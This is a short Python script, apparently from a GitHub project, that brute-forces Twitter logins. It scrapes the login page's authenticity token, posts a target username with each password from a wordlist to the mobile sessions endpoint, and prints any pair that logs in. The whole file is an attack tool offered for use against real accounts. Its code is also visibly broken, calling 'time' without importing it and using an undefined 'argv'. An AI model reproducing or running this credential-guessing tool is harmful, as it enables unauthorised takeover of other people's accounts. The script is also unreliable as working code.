# - - - - - - - - - - - - - - - - - - - - - 
#
# Twitter Bruteforcer developed in Python
#          - - - - - 
# Developed by Chris Poole | @codingplanets
#
# - - - - - - - - - - - - - - - - - - - - - 
#
# To see usages redirect toward;
# https://github.com/codingplanets/TwitterBruteforcer
# README.md will contain the usages
#
# - - - - - - - - - - - - - - - - - - - - - 
#
#        Show some support!
#       Follow me via Twitter
#   http://twitter.com/codingplanets
#
# - - - - - - - - - - - - - - - - - - - - - 
import requests
import sys

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def check_password(username, password):

    # Standard Configuration
    s = requests.Session()

    headers = {'User-Agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'}
    login_url = 'https://mobile.twitter.com/login'
    r = s.get(login_url, headers=headers)

    # Figure out Payload
    auth_token = find_between(str(r.text), '<input name="authenticity_token" type="hidden" value="', '"/>')
    redirect_url = find_between(str(r.text), '<input type="hidden" name="redirect_after_login" value="','">')

    payload = {'authenticity_token':auth_token, 'remember_me':'1', 'wfa':'1', 'redirect_after_login':redirect_url, 'session[username_or_email]':username, 'session[password]':password}
    session_url = 'https://mobile.twitter.com/sessions'
    r = s.post(session_url, headers=headers, data=payload)

    # Password Check
    r = s.get('https://mobile.twitter.com/account')

    if ( username not in r.text ):
        return False
    else:
        return True

def check_file(username, filename):

    # Load Password List
    password_list = [line.rstrip('\n') for line in open(filename)]

    for password in password_list:
        print(password)
        if ( check_password(username, password) == True ):
            print('Username:%s; Password:%s' % (username, password))
            time.sleep(5)

check_file(sys.argv[1], argv[2])
